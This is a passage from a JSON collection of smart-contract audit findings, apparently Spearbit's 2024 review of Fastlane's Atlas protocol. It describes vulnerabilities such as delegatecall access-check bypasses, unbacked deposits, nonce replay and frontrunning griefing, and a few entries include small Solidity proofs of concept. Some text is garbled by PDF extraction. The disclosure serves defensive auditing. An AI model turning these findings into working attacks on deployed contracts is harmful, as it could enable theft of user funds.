purpose. (ExtraEth)EndBalance is used. To make this clear, in the following text The tables below show remarks concerning the (ExtraEth)EndBalance that is contributed to Atlas. ETH (ExtraEth)EndBalance ! invertsBidValue invertsBidValue bidFind==true bidFind==false (ExtraEth)EndBalance is always 0 (ExtraEth)EndBalance is always 0 (ExtraEth)EndBalance = endBal- ance - bidAmount, (ExtraEth)EndBalance = endBal- ance, however includes endBalance solverOp.value and initial bal- ance however includes endBalance solverOp.value and initial bal- ance should be something like: Balance - startBalance ) - bidAmount (end- be should (startBalance - endBalance) - bidAmount something like: ERC20 (ExtraEth)EndBalance ! invertsBidValue invertsBidValue bidFind==true When extra ERC20 dress(this).balance, else 0 tokens ad- When extra ERC20 dress(this).balance, else 0 tokens ad- bidFind==false address(this).balance address(this).balance For ETH and bidFind==true, the (ExtraEth)EndBalance is always 0, so the code could be simplified. For ETH and bidFind==false the (ExtraEth)EndBalancecalculations don't take into account that endBal- ance includes the solverOp.value and the initial ETH balance. When invertsBidValue == true the startBalance for ETH is set to 0 which leads to reverts when inverts- BidValue == true, because the code tries to subtract from 0. With ERC20 and invertsBidValue case:  The PreOps hook is supposed supply initial ERC20 tokens to the ExecutionEnvironment, there is no comment about this.  The solver is supposed (as few as possible) ERC20 tokens from the ExecutionEnvironment, however no allowance is set for the solver. For ERC20 the (ExtraEth)EndBalance is sometimes address(this).balance and sometimes 0, doesn't seem right. this",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "validControl / onlyAtlasEnvironment are not effective in delegatecall situation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The checks validControl / onlyAtlasEnvironment are not effective in delegatecall situation: If the ExecutionEnvironment does a delegatecall to a user contract, or inside any DappControl hook, any data can be provided at the end of the call parameters. Because it also has msg.sender == atlas a large number of calls are possible. See for a proof of concept below. Possible consequences:  The user contract can also into all the hooks of the DappControl contract.  The user contract can also into all other DappControl contracts.  This could also be done via a man in the middle attack: all delegate calls to an attacker DappControl are delegate called to the original DappControl contract. The original DappControl contract isn't aware of this.  The user contract can also reenter into the ExecutionEnvironment, it can:  Adjust all configurations.  Execute all functions.  Call one (or more) solver contracts.  The user contract can also call into other ExecutionEnvironments, but because it is a delegatecall and they all have same code that seems no problem.  All DappControl hooks can call into the following (but the risk is limited because they already have access to the funds of the ExecutionEnvironment):  withdrawERC20()  factoryWithdrawERC20()  withdrawEther()  factoryWithdrawEther() Here is a proof of concept: 9 contract UserContract { function callPreOpsCall(address control) public { console.log(\"in UserContract callPreOpsCall\"); UserOperation memory userOp; bytes memory data = abi.encodeWithSelector(DAppControl.preOpsCall.selector, userOp); bytes memory preOpsData = bytes.concat(data, abi.encodePacked(address(0),bool(false),bool(false),uint8(0),uint8(0), uint16(type(uint16).max), // all states uint24(0),bool(false),bool(false),uint8(2)), abi.encodePacked(address(0), address(control), uint32(0), bytes32(0)) ); (bool success, ) = address(control).delegatecall(preOpsData); console.logBool(success); } } modifier validControl() { if (CONTROL != _control()) revert AtlasErrors.InvalidControl(); _; } modifier onlyAtlasEnvironment(ExecutionPhase phase, uint8 acceptableDepths) { _onlyAtlasEnvironment(phase, acceptableDepths); _; } function _onlyAtlasEnvironment(ExecutionPhase phase, uint8 acceptableDepths) internal view { if (address(this) == source) { revert AtlasErrors.MustBeDelegatecalled(); } if (msg.sender != atlas) { revert AtlasErrors.OnlyAtlas(); } if (uint16(1 << (EXECUTION_PHASE_OFFSET + uint16(phase))) & _lockState() == 0) { revert AtlasErrors.WrongPhase(); } if (1 << _depth() & acceptableDepths == 0) { revert AtlasErrors.WrongDepth(); } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "reconcile() creates deposits out of thin air",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "A call to reconcile() with non-zero maxApprovedGasSpend increases surplus and deposit. Assum- ing maxApprovedGasSpend fits within the bonded balance of the current solver, this will later on be _credited to the solver. However there is no registration or backing of this maxApprovedGasSpend, so this creates a bonded balance out of thin air. The comments say This will be subtracted later, but we couldn't find where this is done. The severity of this issue is increased by the following related issues:  \"reconcile() can be called by anyone\".  \"Checks for solverCalledBack don't cover all situations\". function reconcile(address environment,address solverFrom,uint256 maxApprovedGasSpend) /*...*/ {  s atlETH that the solver is allowing This will be subtracted later - tx will revert here if there  // NOTE: approvedAmount is the amount of the solver // to be used to cover what they owe. isn t // enough. // ... uint256 bondedBalance = uint256(accessData[solverFrom].bonded); if (maxApprovedGasSpend > bondedBalance) maxApprovedGasSpend = bondedBalance; // ... uint256 surplus = deposits + maxApprovedGasSpend + msg.value; // Add msg.value to solver s deposits if (msg.value > 0 || maxApprovedGasSpend > 0) deposits = surplus; // ...  ,! } // deposits is increased now",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Flag _solverFulfilled is unreliable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function reconcile() sets the flag _solverFulfilled if sufficient funds are present. Later on validateBalances() trusts this flag and doesn't do any additional checks. However after a call reconcile() it is still possible to do _borrow() and _contribute(), which change with- drawals and deposits. This could be done in the same hook that calls reconcile(). 11 function reconcile(/*...*/ ) /*...*/ { // ... uint256 deficit = claims + withdrawals; uint256 surplus = deposits + maxApprovedGasSpend + msg.value; // ... if (deficit > surplus) { // ... return deficit - surplus; } // CASE: Callback verified and solver duty fulfilled if (!calledBack || !fulfilled) { _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack | _solverFulfilled; } return 0; } function validateBalances() external view returns (bool calledBack, bool fulfilled) { (, calledBack, fulfilled) = solverLockData(); if (!fulfilled) { uint256 _deposits = deposits; // Check if locked. if (_deposits != type(uint256).max) { fulfilled = deposits >= claims + withdrawals; } } } function solverLockData() public view returns (address currentSolver, bool calledBack, bool fulfilled) { uint256 solverLock = _solverLock; // ... fulfilled = solverLock & _solverFulfilled != 0; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Nonce logic is skipped for smart contract wallets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "If the userOp.from address is a smart contract, the _verifyUser() function makes a call to the user's validateUserOp() function. This call is expected to return a success bool value, which is instantly returned. Since this return happens before the code reaches _handleNonces(), there is no nonce validation for smart con- tract wallets. Most smart contract validation functions (e.g. validateUserOp() in the case of ERC4337 or is- ValidSignature() in the case of ERC1271) do not manage nonces themselves, and rely on the caller for this. As a result, signatures can be replayed and nonces can be reused when the user is a smart contract wallet. Also see the issue titled \"Call to validateUserOp() won't work\", which suggests replacing validateUserOp() with isValidSignature().",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_releaseSolverLock() doesn't undo all the actions of _trySolverLock()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function _releaseSolverLock() doesn't undo all the actions of _trySolverLock(). Function _releaseSolverLock() keeps _solverLock set to the (latest) solver, which means that in the Allocat- eValue hook and PostOps hook this value is still set. This allows reconcile() to still be called, even after it has been made authorized. See issue \"reconcile() can be called by anyone\". Function _releaseSolverLock() doesn't undo the addition to withdrawals. This is good for the winning solver, because the ETH has been send to solverMetaTryCatch(). However if solverMetaTryCatch() reverts this is not good. The value of withdrawals will increase with every unsuccessfulsolver until eventually it is higher than the address(this).balance. After that the next solvers will fail because _borrow() will return false. Also see issue \"Check with withdrawals in _borrow() not correct \". Furthermore _releaseSolverLock() isn't always called, see issues:  \"Solvers don't always reimburse the bundler\".  \"Winning solver doesn't get gas costs _assign()ed\". Sometimes _releaseSolverLock() is called without _trySolverLock():  \"_releaseSolverLock() can be run without _trySolverLock()\". Additionally function _releaseSolverLock() assigns used gas, which isn't shown in the function name. 13 function _trySolverLock(SolverOperation calldata solverOp) internal returns (bool valid) { if (_borrow(solverOp.value)) { _solverLock = uint256(uint160(solverOp.from)); return true; } else { return false; } } function _releaseSolverLock(/*...*/ ) /*...*/ { // doesn // doesn t set _solverLock t change withdrawals   } function _borrow(uint256 amount) internal returns (bool valid) { // ... if (address(this).balance < amount + claims + withdrawals) return false; withdrawals += amount; return true; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "solverMetaTryCatch() assumes there is no pre-existing ETH in contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "solverOp.value: solverMetaTryCatch() requires ExecutionEnvironment's balance to be the same as require(address(this).balance == solverOp.value, \"ERR-CE05 IncorrectValue\"); However, someone can frontrun this transaction and send some ETH to ExecutionEnvironment making its balance non-zero. This leads to the solverMetaTryCatch() call reverting, since the call is sent with an ETH amount equal to solverOp.value. This makes address(this).balance > solverOp.value. Since the error would be treated as SolverOutcome.EVMError in the _solverOpWrapper(), the solver would be forced to pay the gas costs for this revert.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Bid tokens aren't enforced to be the same",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In Atlas, bid tokens are specified in multiple locations: 1. Within the DAppConfig (specifically from the getBidFormat() function). 2. Within each SolverOperation. Currently, it's not enforced on-chain that these values are all consistent with each other. If the auctioneer or bundler includes different tokens in a transaction, the bid amount comparisons and the allocateValueCall() function would silently break, which could lead to unexpected results.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "No slippage protection for UniswapV2 swaps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "amount0In and amount1In values are dependent on UniswapV2 pool's current token balance and on amount-out values. Someone can sandwich Atlas transaction to imbalance the pool leading to high amount-in value which is then transferred from user to the pool. The attacker makes a profit through this sandwich and thus it's likely that all the token balance of the user is transferred to the pool.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "bypassSignatoryApproval skips important checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In the initial AtlasVerification call, the _verifyDApp() function does various checks on the dAppOp argument. For example, see the following code snippet (with some comments removed for simplicity): function _verifyDApp( DAppConfig memory dConfig, DAppOperation calldata dAppOp, address msgSender, bool bypassSignatoryApproval, bool isSimulation ) { internal returns (bool, ValidCallsResult) bool bypassSignature = msgSender == dAppOp.from || (isSimulation && dAppOp.signature.length == 0); if (!bypassSignature && !_verifyDAppSignature(dAppOp)) { return (false, ValidCallsResult.DAppSignatureInvalid); } if (bypassSignatoryApproval) return (true, ValidCallsResult.Valid); // If bypass, return true after signature ,! // verification if (dAppOp.bundler != address(0) && msgSender != dAppOp.bundler) { if (!signatories[keccak256(abi.encodePacked(dAppOp.control, msgSender))]) { bool bypassSignatoryCheck = isSimulation && dAppOp.from == address(0); if (!isSimulation) { return (false, ValidCallsResult.InvalidBundler); } } } if (!signatories[keccak256(abi.encodePacked(dAppOp.control, dAppOp.from))]) { bool bypassSignatoryCheck = isSimulation && dAppOp.from == address(0); if (!bypassSignatoryCheck) { return (false, ValidCallsResult.DAppSignatureInvalid); } } if (dAppOp.control != dConfig.to) { return (false, ValidCallsResult.InvalidControl); } if (dAppOp.from == address(0) && isSimulation) { return (true, ValidCallsResult.Valid); } if (!_handleNonces(dAppOp.from, dAppOp.nonce, !dConfig.callConfig.needsSequencedDAppNonces(), isSimulation)) { ,! return (false, ValidCallsResult.InvalidDAppNonce); } return (true, ValidCallsResult.Valid); } 16 There are six main checks in this function: 1. A check that dAppOp.from has authorized the transaction (either as msgSender or through a signature). 2. A check that the msgSender is authorized to act as a bundler. 3. A check that the dAppOp.from is authorized to act as the auctioneer. 4. A check that ensures dAppOp.control == dConfig.to . 5. A simulation check for dAppOp.from == address(0). 6. A nonce check (with associated logic that will invalidate the used nonce). This function also includes a bypassSignatoryApproval boolean, which will skip checks 2-6 if true. However, some of these checks should not be skipped, for example, the dAppOp.control check (number 4) and the nonce logic (number 6) seem important to execute regardless of the value of bypassSignatoryApproval. With the nonce check specifically, this behavior would sometimes allow dAppOp nonces to be reused or executed in an unexpected order.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Incorrect indexing for bid sorting algorithm",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "When an Atlas CallConfig specifies exPostBids == true, all solverOps are simulated on-chain to determine their theoretical bid amount. The solverOps are then sorted and executed in order until a solverOp succeeds. The sorting of the bids is facilitated through the following code: 17 uint256[] memory sortedOps = new uint256[](solverOps.length); uint256[] memory bidAmounts = new uint256[](solverOps.length); uint256 j; uint256 bidPlaceholder; for (uint256 i; i < solverOps.length; i++) { bidPlaceholder = _getBidAmount(dConfig, userOp, solverOps[i], returnData, key); if (bidPlaceholder == 0) { unchecked { ++j; } continue; } else { bidAmounts[i] = bidPlaceholder; for (uint256 k = i - j + 1; k > 0; k--) { if (bidPlaceholder > bidAmounts[sortedOps[k - 1]]) { sortedOps[k] = sortedOps[k - 1]; sortedOps[k - 1] = i; } else { sortedOps[k] = i; break; } } } } Notice that the inner for loop starts with the index k = i - j + 1. Since it's possible that j always remains at 0 (i.e. if all bid simulations succeed), this index may be out-of-bounds for the sortedOps array, which will cause an unintended revert. This indexing can also potentially leave the zeroth index unset, which can later lead to duplicate attempts of the first solverOp. Here is a proof of concept to show the issue: // SPDX-License-Identifier: MIT OR Apache-2.0 pragma solidity 0.8.25; import \"hardhat/console.sol\"; contract test { constructor() { uint ol = 2; uint256[] memory _getBidAmount = new uint256[](ol); _getBidAmount[0] = 6; // works if one of these values is 0 _getBidAmount[1] = 6; uint256[] memory sortedOps = new uint256[](ol); uint256[] memory bidAmounts = new uint256[](ol); uint256 j; uint256 bidPlaceholder; for (uint256 i; i < ol; i++) { bidPlaceholder = _getBidAmount[i]; if (bidPlaceholder == 0) { unchecked { ++j;} continue; } else { bidAmounts[i] = bidPlaceholder; for (uint256 k = i - j + 1; k > 0; k--) { if (bidPlaceholder > bidAmounts[sortedOps[k - 1]]) { sortedOps[k] = sortedOps[k - 1]; sortedOps[k - 1] = i; 18 } else { sortedOps[k] = i; break; } } } } uint total = ol - j; console.log(\"total\",total); for (uint256 i; i < total; i++) { console.log(i,sortedOps[i],bidAmounts[sortedOps[i]]); } } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "userOp validation is skipped in simulation mode for smart contract user accounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "It can happen that user has not allowed this userOp (ie, returning validateUserOp() returns false), but during simulation it's falsely believed that the user has allowed it since isSimulation is true: bool validSmartWallet = IAccount(userOp.from).validateUserOp{ gas: 30_000 }(userOp, _getProofHash(userOp), 0) == 0; return (isSimulation || validSmartWallet); If this userOp goes onchain, it leads to a revert wasting gas for the bundler.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "ExecutionEnvironment deployment can be incorrectly skipped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "ExecutionEnvironment is deployed iff the address executionEnvironment, at which it's going to be deployed, has no code. The is checked by ensuring executionEnvironment.codehash is 0. However, someone can frontrun this transaction by sending some ETH to this address. Now codehash returns a non-zero hash and executionEnvironment is never deployed. An address which doesn't have code but has any non-zero ether balance returns keccak256(\"\") as its codehash. This is as per the following EIPs:  From https://eips.ethereum.org/EIPS/eip-161: An account is considered empty when it has no code and zero nonce and zero balance.  From https://eips.ethereum.org/EIPS/eip-1052: In case the account does not exist or is empty (as defined by EIP-161) 0 is pushed to the stack. In case the account does not have code the keccak256 hash of empty data (i.e. is pushed to the c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470) stack.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong ERC20 token transferred",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "tokenUserBuys ERC20 token is transferred here when it's meant to be auctionBaseCurrency since the balance amount transferred is corresponding to auctionBaseCurrency: if (auctionBaseCurrencyBalance > 0) { ERC20(swapIntent.tokenUserBuys).safeTransfer(user, auctionBaseCurrencyBalance); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Borrow()s after validateBalances()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function borrow() can still be called in the AllocateValue and PostOps phases. As this is after validateBalances() the solver has to pay for this in _settle(). However the solver is no longer in control and would be griefed this way. Another risk is highlighted in the issue \"Circumvent AtlETH unbonding period\".",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Simulation success may not guarantee on-chain success",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Before a bundler submits an Atlas transaction on-chain, they will simulate the transaction off-chain to ensure it succeeds. This will likely be done using the Simulator helper contract, or if the suggestion from the issue \"Simulation code path can be kept off-chain\" is taken, with some other off-chain method. Regardless of the approach taken, this is an important step of the Atlas process, since bundlers will waste ETH on gas costs if a transaction reverts. It's important to note that there are situations where off-chain simulation success does not guarantee on-chain success. This is a known concern in systems like ERC4337, which handles this problem with a specific simulation procedure described in ERC7562. For example, this specification disallows certain sections of code from using opcodes that can easily trick simulation (e.g. TIMESTAMP and COINBASE). In Atlas, there are a few locations where this may be a similar concern. This includes:  If userOp.from is a smart contract, the _verifyUser() function calls the contract to verify the user's signa- ture. If there aren't any restrictions on the contract's implementation, it may contain malicious logic designed to revert on-chain and waste the bundler's ETH.  If all solverOps fail, either the UserNotFulfilled() revert happens, or the bundler is treated as the winning solver, and in either case, the bundler is not reimbursed for all gas fees. Since solverOps can contain arbitrary logic, they may revert on-chain even after a successful off-chain simulation.  If any of the preOpsWrapper(), userWrapper(), or postOpsWrapper() functions revert, then the entire exe- cute() call reverts and the bundler will not be reimbursed any gas. This implies that a userOp or DAppControl could grief the bundler if it's designed to trick simulation.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "No quorum requirements for transmit() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In order to transmit() a new oracle update to the ChainlinkAtlasWrapper, a transmitter provides the signatures of other whitelisted signers that are attesting to the oracle update. However, neither of the transmit() or verifyTransmitSigners() functions verify the amount of signatures sub- mitted, and providing an empty array of signatures will technically succeed. This behavior changes the trust assumptions of the ChainlinkDAppControl since a transmitter has full control of each oracle update.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getBidValue() is not always used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Sorter uses getBidValue() to sort the bids. However Atlas / _bidFindingIteration() and escrow / _getBidAmount() don't do that and use solverOp.bidAmount directly. In the example code these values are the same because the following function is used. However in the general case they might be different. function getBidValue(SolverOperation calldata solverOp) public pure override returns (uint256) { return solverOp.bidAmount; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Hashes don't depend on the DAppControl config state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The control address contributes to the hash calculation of the UserOperation, solverOp, and DAp- pOperation structs. This means that when a party provides a signature for verification, they specify exactly which DAppControl address they're interacting with. However, it should be noted that it's possible for a DAppControl to change its behavior while remaining at the same address. For example, a DAppControl can be programmed to return different a CallConfig value on separate calls. While this would change the underlying ExecutionEnvironment address used, the signatures for each UserOperation, solverOp, and DAppOperation would remain valid, which can add unexpected trust assumptions. For instance, a solverOp is not replayable as long as the corresponding solverOp.userOpHash only appears on-chain once. However, if a DAppControl flips its userNoncesSequenced boolean, the same userOp nonce can be used in two different contexts, which might allow the solverOp to be replayed.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Solvers can be unfairly forced into gas refunds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The EscrowBits library defines the circumstances when a solver is required to refund the bundler for gas costs. For example, the SolverOutcome.BidNotPaid flag is part of the _FULL_REFUND value, which means a solver needs to reimburse their gas usage if their solverOp fails due to an insufficient bid. Since these gas costs are forced on the solver, it's important that each error leading to reimbursement is actually something the solver is at fault for. This does not always seem to be the case currently, including the following:  The SolverOutcome.DeadlinePassed flag is part of the _PARTIAL_REFUND value, although the timestamp when a solverOp is included on-chain is something the bundler controls. So, solvers are unnecessarily punished if the bundler includes their solverOp late. 23  The SolverOutcome.GasPriceOverCap flag is part of the _PARTIAL_REFUND value, although the tx.gasprice is something in control of the bundler. So, if the bundler specifies an unreasonably large priority fee, the solver is ultimately punished for not accepting the price. This is also relevant to the SolverOutcome.GasPriceBelowUsers flag when allowsTrustedOpHash() == true, as the solver does not know the userOp.maxFeePerGas ahead of time.  The SolverOutcome.PreSolverFailed flag is part of the _PARTIAL_REFUND value, although the failure of the preSolverCall() may be due to the DAppControl and not the solver. The SolverOutcome.EVMError simi- larly punishes the solver but may be caused by an error during the abi.decode() on the preSolverCall() return value (note: this is suggested to be removed in the issue titled \"preSolverCall() can revert instead of returning false\"). These are contrary to the fact that the SolverOutcome.AlteredControl error can also be caused by unexpected preSolverCall() behavior, but is a part of the _NO_REFUND category.  The SolverOutcome.PerBlockLimit flag is part of the _PARTIAL_REFUND value, but solvers may not be able to prevent multiple of their solverOps executing in the same block. For example, if a solver interacts with a DAppControl with allowsTrustedOpHash() == true, they may not know exactly when their transactions will be executed on-chain, and may accidentally be included twice in a block.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_bidFindingIteration doesn't reset key.callIndex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "_bidFindingIteration() sends key as a memory parameter to _getBidAmount(), which means it is sent by reference. _getBidAmount() increments key.callIndex via holdSolverLock(). Values of key that are updated in _bidFindingIteration() can be used in the following loop iteration. If that would not work, then key.callIndex would be the same every time. Also see: \"Passsing of key can be simplified\". After the last loop the value of key.callIndex == solverOps.length. Then the second loop with _execute- SolverOperation() starts, which continues to use key.callIndex. So key.callIndex could end up to be 2x solverOps.length, depending on the winning solver. However considering issue \"callIndex incremented twice\" in _executeSolverOperation() : key.callIndex could end up to be 3(cid:2) solverOps.length, depending on the winning solver. Because callIndex is of type uint8, only 256/3 == 83 solvers can be supported, which is a lot less than MAX_SOLVERS (253). 24 struct EscrowKey { // ... uint8 callIndex; // ... } function _bidFindingIteration(/*...*/ ) /*...*/ { // ... for (uint256 i; i < solverOps.length; i++) { bidPlaceholder = _getBidAmount(dConfig, userOp, solverOps[i], returnData, key); // ... } // key.callIndex == solverOps.length for (uint256 i; i < j; i++) { // ... (auctionWon, key) = _executeSolverOperation(..., key); // continues to use key // ... } } function _getBidAmount(..., EscrowKey memory key) /*...*/ { // ... data = abi.encodePacked(data, key.holdSolverLock(solverOp.solver).pack()); // increment callIndex // ... } function holdSolverLock(EscrowKey memory self, address nextSolver) internal pure returns (EscrowKey ,! memory) { // ... ++self.callIndex; // ... } Here is a proof of concept that shows the issue: 25 // SPDX-License-Identifier: MIT OR Apache-2.0 pragma solidity 0.8.25; import \"hardhat/console.sol\"; struct EscrowKey { uint8 callIndex; } library SafetyBits { function holdSolverLock(EscrowKey memory self) internal pure returns (EscrowKey memory) { ++self.callIndex; return self; } } contract test { using SafetyBits for EscrowKey; function _bidFindingIteration(EscrowKey memory key) public { uint ol = 10; for (uint256 i; i < ol; i++) { _getBidAmount(key); } console.log(\"key.callIndex=\",key.callIndex); // 10 } function _getBidAmount(EscrowKey memory key) internal { key.holdSolverLock(); } constructor() { EscrowKey memory key; _bidFindingIteration(key); } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "atlasSolverCall() doesn't check caller",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function atlasSolverCall() doesn't check if its called from/via Altas. It does check sender, but this is a user supplied variable so has no guarantees. Without checks the code might potentially be abused. function atlasSolverCall( address sender, /*...*/ ) /*...*/ safetyFirst(sender) /*...*/ { // ... } modifier safetyFirst(address sender) { require(sender == _owner, \"INVALID CALLER\"); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Circumvent AtlETH unbonding period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function _assign() allows the usage of ETH that is bonded. This is what it is designed for. Here is an approach to abuse this:  Assume one party combines all roles: user, auctioneer, bundler, solver and DappControl.  The party borrows ETH after validateBalances(), see issue \"Borrow()s after validateBalances()\".  Assume the borrowed amount is less than the bonded balance of the party.  With _settle(), the borrowed amount subtracted from the bonded balance of the party.  The party still has the borrowed amount. So effectively ETH is freed while it was bonded, without have to wait for the AtlETH unbond period. function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { // ... EscrowAccountAccessData memory aData = accessData[owner]; if (aData.bonded < amt) { // ... } else { aData.bonded -= amt; } accessData[owner] = aData; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check with withdrawals in _borrow() is incorrect",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The check with withdrawals in function _borrow() doesn't seem correct because balance is de- creased with safeTransferETH, when withdrawals is increased so it counts double. This example shows the issue:  Assume claims and the initial value of withdrawals are neglectible.  Assume atlas contains 100 ETH.  Try to borrow 75 ETH:  (address(this).balance < amount + claims + withdrawals) ) 100 ETH < 70 ETH + 0 + 0 ) ok to borrow.  After this. withdrawals == 75 ETH and balance == 25 ETH.  Now try to borrow an extra 10 ETH.  (address(this).balance < amount + claims + withdrawals) ) 25 ETH < 10 ETH + 0 + 75 ETH ) not ok to borrow. So you can't borrow the extra 10 ETH although atlas still has enough ETH. However if you directly borrow 85 ETH then there is no problem. Also see issue \"_releaseSolverLock() doesn't undo all the actions of _trySolverLock()\" for another issue with the check in _borrow(). function borrow(uint256 amount) external payable { // ... if (_borrow(amount)) { SafeTransferLib.safeTransferETH(msg.sender, amount); } else { revert InsufficientAtlETHBalance(address(this).balance, amount); } } function _borrow(uint256 amount) internal returns (bool valid) { if (amount == 0) return true; if (address(this).balance < amount + claims + withdrawals) return false; withdrawals += amount; return true; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Checks for solverCalledBack don't cover all situations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function solverMetaTryCatch() checks reconcile() isn't called by the PreSolver and that it is called by the PostSolver. However these checks don't cover all situations:  If needsPreSolver() == false then the first check isn't done.  If needsSolverPostCall() == false then the second check isn't done. function solverMetaTryCatch(/*...*/ ) /*...*/ { // ... if (config.needsPreSolver()) { // call PreSolver // ... (, success,) = IEscrow(atlas).solverLockData(); if (success) revert AtlasErrors.InvalidEntry(); } // call atlasSolverCall if (config.needsSolverPostCall()) { // check reconcile() has been called // Verify that the solver contract hit the callback before handing over to PostSolver hook (, success,) = IEscrow(atlas).solverLockData(); // check reconcile() has been called if (!success) revert AtlasErrors.CallbackNotCalled(); // call postSolverCall } // ... } function reconcile(/*...*/ ) // ... // ... _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack; // ... } function solverLockData() public view returns (address currentSolver, bool calledBack, bool fulfilled) { uint256 solverLock = _solverLock; // ... calledBack = solverLock & _solverCalledBack != 0; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ChainlinkAtlasWrapper may break protocol integrations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
